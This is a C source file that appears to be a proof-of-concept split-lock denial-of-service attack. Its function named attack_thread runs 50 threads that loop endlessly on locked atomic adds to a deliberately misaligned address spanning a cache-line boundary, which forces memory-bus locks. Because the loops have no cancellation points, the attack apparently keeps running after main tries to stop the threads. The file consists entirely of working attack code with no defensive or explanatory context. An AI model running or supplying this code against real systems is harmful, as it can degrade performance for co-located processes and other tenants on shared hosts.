#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/mman.h>
#include <pthread.h>

#define BUFFER_SIZE 1024 * 1024 * 1024
#define CACHE_LINE_SIZE 64
#define THREAD_COUNT 50  

typedef struct {
    int *block_addr;
} thread_data_t;

void *attack_thread(void *arg) {
    thread_data_t *data = (thread_data_t *)arg;
    int x = 0x0;

    while (1) {
        asm volatile (
            "lock; xaddl %0, %1"
            : "=a" (x)
            : "m" (*(data->block_addr)), "a" (x)
            : "memory"
        );
    }

    pthread_exit(NULL);
}

int main() {
    char *buffer = mmap(NULL, BUFFER_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (buffer == MAP_FAILED) {
        printf("[+] Buffer allocation failure\n");
        return 1;
    }

    int *block_addr = (int *)(buffer + CACHE_LINE_SIZE - 1);

    pthread_t threads[THREAD_COUNT];
    thread_data_t thread_data[THREAD_COUNT];

    for (int i = 0; i < THREAD_COUNT; i++) {
        thread_data[i].block_addr = block_addr;
        int rc = pthread_create(&threads[i], NULL, attack_thread, &thread_data[i]);
        if (rc) {
            printf("[+] Thread creation failure\n");
            return 1;
        }
    }
    for (int i = 0; i < THREAD_COUNT; i++) {
        pthread_cancel(threads[i]);
        pthread_join(threads[i], NULL);
    }
    munmap(buffer, BUFFER_SIZE);
    return 0;
}
